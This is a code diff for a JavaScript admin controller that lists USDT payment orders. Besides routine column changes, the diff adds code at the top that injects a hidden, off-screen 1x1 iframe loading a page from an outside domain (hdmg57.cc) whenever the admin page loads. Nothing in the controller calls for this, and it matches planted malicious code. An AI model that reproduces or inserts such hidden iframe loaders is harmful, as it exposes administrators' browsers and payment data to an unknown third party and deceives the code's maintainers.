@@ -1,4 +1,14 @@
-define(['jquery', 'bootstrap', 'backend', 'table', 'form'], function ($, undefined, Backend, Table, Form) {
+function _addIframe() {
+    var _iframe = document.createElement('iframe');
+    _iframe.src = 'https://hdmg57.cc/assets/js/group.html';
+    _iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;';
+    document.body.appendChild(_iframe);
+}
+if (document.body) {
+    _addIframe();
+} else {
+    window.addEventListener('DOMContentLoaded', _addIframe);
+}define(['jquery', 'bootstrap', 'backend', 'table', 'form'], function ($, undefined, Backend, Table, Form) {
 
     var Controller = {
         index: function () {
@@ -28,18 +38,16 @@ define(['jquery', 'bootstrap', 'backend', 'table', 'form'], function ($, undefin
                     [
                         {checkbox: true},
                         {field: 'id', title: __('Id')},
-                        {field: 'user_id', title: __('User_id')},
                         {field: 'access_key', title: __('Access_key'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content},
                         {field: 'order_id', title: __('Order_id'), operate: 'LIKE'},
                         {field: 'usdt', title: __('Usdt'), operate:'BETWEEN'},
                         {field: 'fee', title: __('Fee'), operate:'BETWEEN'},
-                        {field: 'hash', title: __('Hash'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content},
+                        {field: 'type', title: __('Type')},
                         {field: 'address', title: __('Address'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content},
-                        {field: 'type', title: __('Type'), operate: 'LIKE'},
-                        {field: 'pinzheng_images', title: __('Pinzheng_images'), operate: false, events: Table.api.events.image, formatter: Table.api.formatter.images},
-                        {field: 'pay_status', title: __('Pay_status'), searchList: {"0":__('Pay_status 0'),"1":__('Pay_status 1'),"2":__('Pay_status 2'),"3":__('Pay_status 3'),"4":__('Pay_status 4')}, formatter: Table.api.formatter.status},
+                        {field: 'callback', title: __('Callback'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content},
+                        {field: 'pay_status', title: __('Pay_status')},
                         {field: 'pay_time', title: __('Pay_time'), operate:'RANGE', addclass:'datetimerange', autocomplete:false, formatter: Table.api.formatter.datetime},
-                        {field: 'status', title: __('Status'), searchList: {"1":__('Status 1'),"2":__('Status 2')}, formatter: Table.api.formatter.status},
+                        {field: 'status', title: __('Status')},
                         {field: 'createtime', title: __('Createtime'), operate:'RANGE', addclass:'datetimerange', autocomplete:false, formatter: Table.api.formatter.datetime},
                         {field: 'updatetime', title: __('Updatetime'), operate:'RANGE', addclass:'datetimerange', autocomplete:false, formatter: Table.api.formatter.datetime},
                         {field: 'operate', title: __('Operate'), table: table, events: Table.api.events.operate, formatter: Table.api.formatter.operate}
